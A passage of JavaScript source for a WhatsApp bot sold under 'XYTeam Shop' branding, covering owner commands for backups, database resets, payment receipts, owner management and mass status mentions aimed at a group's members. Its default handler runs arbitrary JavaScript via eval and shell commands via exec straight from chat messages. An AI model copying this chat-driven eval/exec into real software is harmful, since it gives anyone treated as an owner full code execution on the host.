        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "create-storywa": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await conn.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await conn.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await conn.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: conn.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await conn.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return m.reply(`Berhasil membuat status tag grup ${nama}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V6${global.versi}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "suk": case "danamasuk": case "masukwait": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return m.reply(example(`Contoh: ${prefix+command} [nominal] | [keterangan]`));

    // Memisahkan input nominal dan keterangan
    const [nominal, ...details] = q.split("|");
    if (!nominal || details.length === 0) return m.reply(`Format salah! Gunakan: ${prefix+command} [nominal] | [keterangan]`);

    let teks = `💵 *Dana Masuk*
─────────────────────
💲 *Nominal:* Rp${nominal.replace(/\B(?=(\d{3})+(?!\d))/g, ".")}
📝 *Keterangan:* ${details.join(" ")}
⏰ *Waktu:* ${jam}
🕡 *Tanggal:* ${penghitung}

© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID
─────────────────────`;

    await conn.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `Dana Masuk Rp${nominal.replace(/\B(?=(\d{3})+(?!\d))/g, ".")} ✅`,
                body: `© Powered By ${namaOwner}`,
                thumbnailUrl: global.image.reply,
                sourceUrl: linkSaluran,
            }
        }
    }, {quoted: qtoko});
}
break

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await conn.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await conn.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = ` *── List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`ʙᴇɢᴏ ᴀᴍᴀᴛ ᴍᴀᴜ ʜᴀᴘᴜs ᴏᴡɴᴇʀ ᴛᴀᴍpᴀɴ ɢᴜᴀ`)
if (!owners.includes(input)) return m.reply(`ʟᴀʜ ${input2} ᴅɪᴀ ᴇᴍᴀɴɢ ʙᴜᴋᴀɴ ᴏᴡɴᴇʀ ᴘᴇᴀ`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`ᴜᴅᴀ ᴅɪ ʙɪʟᴀɴɢɪɴ ᴊᴀɴɢᴀɴ ᴛᴏʟᴏʟ ᴡᴋᴡᴋ 🥱`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`ʟᴀʜ ${input2} sɪ ᴋᴏɴᴛᴏʟ ɪɴɪ ᴜᴅᴀ ᴏᴡɴᴇʀ ᴘᴇᴀ`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Done kan🗿☕?`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("sᴜᴍᴘᴀʜ ʟᴜ banyak ngomong😜🔥")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "628xxx@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error :*\n
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});